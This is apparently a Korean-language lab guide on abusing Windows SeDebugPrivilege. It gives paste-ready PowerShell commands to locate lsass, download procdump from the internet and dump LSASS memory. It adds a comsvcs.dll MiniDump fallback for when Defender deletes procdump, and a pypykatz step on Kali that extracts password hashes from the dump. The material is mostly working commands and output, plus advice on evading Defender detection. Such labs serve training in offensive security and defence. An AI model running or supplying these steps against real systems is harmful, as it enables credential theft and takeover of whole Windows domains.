# SeDebugPrivilege — 실습

- 뜻: 디버그
- 핵심: 다른 프로세스의 메모리를 읽고 쓸 수 있다. SYSTEM 프로세스에도 디버거를 붙일 수 있다.
- 전제: 아래 블록을 한 번에 하나씩 붙여넣는다. `DONE_`이 안 보이면 실행 안 된 것이다.

# 1. 특권 상태 확인

```powershell
whoami /priv | findstr /i "SeDebug"; Write-Output DONE_01
```

```text
SeDebugPrivilege              Debug programs                            Enabled
DONE_01
```

# 2. 실습: SYSTEM 프로세스 찾기 (PID 확보)

```powershell
$p=(Get-Process -Name lsass).Id; Write-Output $p; Write-Output DONE_02
```

```text
1024
DONE_02
```

- PID가 숫자로 찍히면 SeDebug로 lsass에 접근 가능한 상태다
- 보조 확인 (선택):

```powershell
tasklist /FI "IMAGENAME eq lsass.exe"; Write-Output DONE_02b
```

```text
lsass.exe                   1024 Services                                   0      5,200 K
DONE_02b
```

# 3. 실습: LSASS 메모리 덤프 (procdump)

Local Security Authority Subsystem Service

- 작업 폴더 준비 (출력 객체 + 완료 마커가 함께 보인다)

```powershell
$ProgressPreference='SilentlyContinue'; New-Item -Path C:\temp -ItemType Directory -Force; Write-Output DONE_mkdir
```

```text
Mode LastWriteTime Length Name
---- ------------- ------ ----
d---- ...                temp
DONE_mkdir
```

- Sysinternals procdump 다운로드 (성공 시 본문 출력 없음 → `DONE_dl`로 확인)

```powershell
$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -TimeoutSec 20 https://live.sysinternals.com/procdump.exe -OutFile C:\temp\procdump.exe; Write-Output DONE_dl
```

```text
DONE_dl
```

- 다운로드 검증 (테이블이 비어 보이면 이 스칼라 확인을 쓴다)

```powershell
Test-Path C:\temp\procdump.exe; (Get-Item C:\temp\procdump.exe).Length; Write-Output DONE_size
```

```text
True
300000
DONE_size
```

- `False` 또는 `Cannot find path`가 나오면 다운로드 실패 → 외부망 차단이므로 04 문서의 Kali 경유(`certutil`) 방식으로 전환한다
- 덤프 실행 (SeDebug가 있어야 SYSTEM 프로세스에 접근 가능)

```powershell
C:\temp\procdump.exe -accepteula -ma (Get-Process -Name lsass).Id C:\temp\lsass.dmp; Write-Output DONE_dump
```

```text
[00:00:00] Dumping process (1024) to C:\temp\lsass.dmp: 100%
Dump complete: 1 dump file written.
DONE_dump
```

- Defender가 procdump를 삭제하면 내장 방식 (파일 전송 불필요)

```powershell
$p=(Get-Process -Name lsass).Id; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\temp\lsass.dmp full; Write-Output DONE_comsvcs
```

```text
DONE_comsvcs
```

- 덤프 파일 확인

```powershell
Test-Path C:\temp\lsass.dmp; (Get-Item C:\temp\lsass.dmp).Length; Write-Output DONE_verify
```

```text
True
52428800
DONE_verify
```

# 4. 실습: 덤프에서 자격 증명 추출 (Kali)

- dmp를 Kali로 가져온 뒤 실행. 타겟에서 mimikatz를 직접 돌리지 않는다 (Defender 탐지)

```bash
pypykatz lsa minidump /tmp/lsass.dmp
```

```text
== LogonSession ==
authentication_id REDACTED
username: Administrator
domainname: TARGET
msv_creds: username REDACTED / nthash REDACTED
```

# 5. 이해 포인트

- SeDebug가 있으면 SYSTEM 프로세스 메모리를 읽을 수 있다
- LSASS에는 로그인한 사용자의 패스워드/해시/티켓이 평문 또는 복호화 가능한 형태로 있다
- 그래서 SeDebug = 사실상 자격 증명 탈취 = 도메인 전체 장악의 시작점
